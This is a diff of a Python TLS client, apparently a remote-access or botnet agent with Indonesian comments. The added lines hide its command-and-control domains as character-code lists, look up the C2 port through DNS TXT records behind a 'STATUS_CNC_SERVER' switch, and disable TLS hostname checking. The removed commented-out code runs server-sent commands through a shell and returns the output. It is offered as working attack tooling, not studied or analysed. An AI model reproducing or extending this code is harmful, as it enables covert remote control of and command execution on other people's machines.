@@ -23,37 +23,44 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 
+
+
+
+# ip addres
+parts = [99, 99, 46, 97, 103, 117, 110, 103, 115, 117, 114, 121, 97, 46, 109, 121, 46, 105, 100]
+domain_genshin = ''.join(map(lambda x: chr(x), parts))
+
+
+# ----------------------------- cari port -----------------------------
+domain_root = ''.join(map(eval("lambda x: chr(x)"), [
+    114, 111, 111, 116, 46, 97, 103, 117, 110, 103,
+    115, 117, 114, 121, 97, 46, 109, 121, 46, 105, 100
+]))
+# ---------------------------------------------------------------------
+
+STATUS_CNC_SERVER = 1  # Set to 1 to enable CNC server, 0 to disable
+
+if STATUS_CNC_SERVER == 1:
+    try:
+        answers = dns.resolver.resolve(domain_root, 'TXT')
+        for rdata in answers:
+            for txt_string in rdata.strings:
+                print(txt_string.decode())
+                port = int(txt_string.decode())
+            print(f"Port yang ditemukan: {port}")
+    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.Timeout, dns.resolver.NoNameservers, Exception) as e:
+        port = 7090
+else:
+    port = 7090
+
+
+
+
 # ----------------------------- Configuration -----------------------------
 
-
-
-# parts = [99, 99, 46, 97, 103, 117, 110, 103, 115, 117, 114, 121, 97, 46, 109, 121, 46, 105, 100]
-# domain_genshin = ''.join(map(lambda x: chr(x), parts))
-
-# domain_root = ''.join(map(eval("lambda x: chr(x)"), [
-#     114, 111, 111, 116, 46, 97, 103, 117, 110, 103,
-#     115, 117, 114, 121, 97, 46, 109, 121, 46, 105, 100
-# ]))
-
-
-# STATUS_CNC_SERVER = 1  # Set to 1 to enable CNC server, 0 to disable
-
-# if STATUS_CNC_SERVER == 1:
-#     try:
-#         answers = dns.resolver.resolve(domain_root, 'TXT')
-#         for rdata in answers:
-#             for txt_string in rdata.strings:
-#                 print(txt_string.decode())
-#                 port = int(txt_string.decode())
-#             #print(f"Port yang ditemukan: {port}")
-#     except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.Timeout, dns.resolver.NoNameservers, Exception) as e:
-#         port = 7090
-# else:
-#     port = 7090
-
-
-HOST = "141.11.190.106"
-PORT = 43979
+HOST = domain_genshin
+CHECK_HOSTNAME = False # untuk cek sertifikat 
+PORT = port
 RECONNECT_DELAY = 10
 HEARTBEAT_INTERVAL = 10
 HEARTBEAT_TIMEOUT = 35
@@ -63,7 +70,7 @@ CA_CERT_FILE = "certs/ca.crt"  # CA certificate used to validate the server
 
 # Replace this value with the SAME randomly generated secret on both sides.
 # Keep it private; do not commit production secrets to source control.
-PRE_SHARED_KEY = b"7mQx9VbK2pLwF4nYc8TjH6sRzA1eU5dG"
+PRE_SHARED_KEY = b""
 
 # ------------------------------- Crypto -----------------------------------
 
@@ -132,40 +139,6 @@ def send_message(sock: ssl.SSLSocket, lock: threading.Lock, message: dict) -> No
         sock.sendall(packet)
 
 
-
-# def handle_message(text: str) -> str:
-#     """Customize this function for your application. Do not execute raw input."""
-#     print(f"\n[SERVER] {text}")
-# # contoh text tes
-# #             text 2
-# #             text 3
-
-# # kirim pesan langsung ke serever tanpa return contoh s.send("test") jadi di serrver tidak perlu input ping, misalnya server tidak mengirim aapa lalu cilent ngirim text gimana?
-    
-#     return "Pesan diterima oleh client"
-
-
-# def handle_message(text: str) -> str:
-#     """Handle pesan dari server."""
-
-#     # Deteksi PING dari server
-#     if text.strip().upper() == "cd":
-#         os.chdir(text[3:].decode("utf-8"))
-#         print("masuk sini")
-#     if len(text) > 0:
-#         print("masuk leng >0")
-#         cmd = subprocess.Popen(text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-#         output_bytes = cmd.stdout.read() + cmd.stderr.read()
-#         output_str = str(output_bytes, "utf-8")
-#         print(output_str)
-#         #print("[CLIENT] Menerima PING dari server")
-#         return output_str
-
-#     print(f"\n[CLIENT] {text}")
-
-#     return "Pesan diterima oleh client"
-
-
 # ---------------------------- Application ---------------------------------
 
 def handle_message(text: str) -> str:
@@ -192,47 +165,7 @@ def handle_message(text: str) -> str:
 
 
 
-"""
-
-
-def receive_commands():
-    global s
-    while True:
-        try:
-            #encrypted = encrypt(data)
-            data = s.recv(1024)
-            print(data)
-            if not data:
-                raise ConnectionResetError("Empty data (connection likely closed)")
-            
-            #encrypted = encrypt(command)
-            command = data.decode("utf-8").strip()
-
-            if command.startswith("cd "):
-                print(command)
-                try:
-                    os.chdir(command[3:])
-                    s.send(str.encode("[CD] Moved to " + os.getcwd() + "\n"))
-                except Exception as e:
-                    s.send(str.encode("[CD ERROR] " + str(e) + "\n"))
-            else:
-                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                output = proc.stdout.read() + proc.stderr.read()
-                output += bytes(os.getcwd() + "> ", "utf-8")
-                s.send(output)
-                print(output)
-
-        except (socket.timeout, ConnectionResetError, ConnectionAbortedError, socket.error) as e:
-            print(e)
-            print("[ERROR] Connection lost:", e)
-            reconnect()
-
-"""
-
 class ClientConnection:
-
-
-
 
     
     def __init__(self, sock: ssl.SSLSocket):
@@ -322,10 +255,9 @@ def create_tls_context() -> ssl.SSLContext:
         )
     context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=CA_CERT_FILE)
     context.minimum_version = ssl.TLSVersion.TLSv1_2
-    context.check_hostname = True
+    context.check_hostname = CHECK_HOSTNAME
     context.verify_mode = ssl.CERT_REQUIRED
     return context
-
 
 
 
